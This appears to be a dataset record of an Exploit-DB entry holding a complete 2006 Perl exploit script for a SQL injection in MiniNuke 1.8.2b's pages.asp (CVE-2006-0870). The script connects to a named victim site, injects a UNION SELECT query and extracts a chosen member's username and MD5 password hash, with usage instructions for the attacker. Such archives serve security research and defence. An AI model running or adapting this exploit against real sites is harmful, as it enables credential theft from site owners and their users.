{
  "id": "1514",
  "title": "MiniNuke 1.8.2b - &#039;pages.asp&#039; SQL Injection",
  "cve": "CVE-2006-0870",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#Method found & Exploit scripted by nukedx\r\n#Contacts > ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com\r\n#Orginal advisory: http://www.nukedx.com/?viewdoc=9\r\n#Usage: mini.pl <victim.com> </mininuke-dir> <userid>\r\nuse IO::Socket;\r\nif(@ARGV != 3){\r\nprint \"\r\n+**********************************************************************+\r\n+Welcome to MiniNuke CMS System all versions (pages.asp) SQL-inject xpl+\r\n+            Usage: mini.pl <victim> <directory> <userid>              +\r\n+                    Example: mini.pl sux.com / 1                      +\r\n+               Method found & Exploit scripted by nukedx              +\r\n+**********************************************************************+\r\n\";\r\nexit();\r\n}\r\n#Local variables\r\n$server = $ARGV[0];\r\n$server =~ s/(http:\\/\\/)//eg;\r\n$port = \"80\";\r\n$mndir = $ARGV[1];\r\n$victimid = $ARGV[2];\r\n$sreq =\"http://\".$server.$mndir.\"pages.asp?id=3%20union+select+0,kul_adi,sifre,0,0+from+members+where+uye_id=\".$victimid;\r\n#Writing data to socket\r\nprint \"+**********************************************************************+\\n\";\r\nprint \"+ Trying to connect: $server\\n\";\r\n$mns = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => \"$server\", PeerPort => \"$port\") || die \"\\n+ Connection failed...\\n\";\r\nprint $mns \"GET $sreq\\n\";\r\nprint $mns \"Host: $server\\n\";\r\nprint $mns \"Accept: */*\\n\";\r\nprint $mns \"Connection: close\\n\\n\";\r\nprint \"+ Connected!...\\n\";\r\n\twhile($answer = <$mns>) {\r\n\t\tif ($answer =~ /([\\d,a-f]{32})/) { \r\n\t\t\tprint \"+ USERID: $victimid\\n\";\r\n                        print \"+ MD5 HASH: $1\\n\";\r\n\t\t\tprint \"+**********************************************************************+\\n\";\r\n\t\t\texit(); }\r\n\t\tif ($answer =~ /number of columns/) { \r\n                print \"+ This version of Mini-Nuke is vulnerable too but default query of SQL-inject does not work on it\\n\";\r\n                print \"+ So please edit query by manually adding null data..\\n\";\r\n                exit(); }\r\n\t}\r\nprint \"+ Exploit failed\\n\";\r\nprint \"+**********************************************************************+\\n\";\r\n\r\n# nukedx.com [2006-02-19]\r\n\r\n# milw0rm.com [2006-02-19]",
  "url": "https://www.exploit-db.com/exploits/1514"
}